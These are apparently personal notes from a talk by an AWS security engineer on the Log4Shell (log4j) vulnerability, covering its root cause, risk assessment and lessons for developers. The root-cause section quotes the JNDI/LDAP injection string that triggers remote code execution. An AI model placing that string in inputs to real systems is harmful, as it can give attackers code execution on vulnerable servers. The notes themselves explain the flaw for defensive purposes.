# Partner Power Hour 3 - How log4j broke the internet - 01/22/2022

**presenter**: David Lee

- security engineer @AWS
  - indicent response
  - Risk analysis and migration
  - Security guidance

Today, David Lee was talking about how log4j broke the internet and sharing the lessons learned from it. The log4j vulnerability was disclosed to Apache in 11/24/2021 and it developed to a big security issue we have ever seen.

- Problem: log4shell allows RCE (Remote Code Excution)
- Root cause: Bad Input validation
  - Log4shell exploits JNDI and LDAP to let an attacker issue commands `${jndi:ldap://ip/exploit}`
  - lack of input validation
  - Log4j completely ignores input validation and host excutes whatever it sees come in through JNDI/LDAP
- A level of risk is determined by three factors:

  - Threat likelihood
  - Asset value
  - Vulnerability exposure

- Four ways to responde a risk

  - Avoid
  - Mitigate
  - Transfer
  - Accept

- Lessons learned for Devs

  - Know 3p risks
  - Supply chain security
  - Risk analysis of partner apps
  - Use a DevOps pipeline
  - Defense in depth
  - Reduce risk

- Terminology
  - A valnerability is a weakness in a system that could potentially be exploited given the right circumstancs
  - CVSS - Common Vulnerability Scoring System - assess the severity
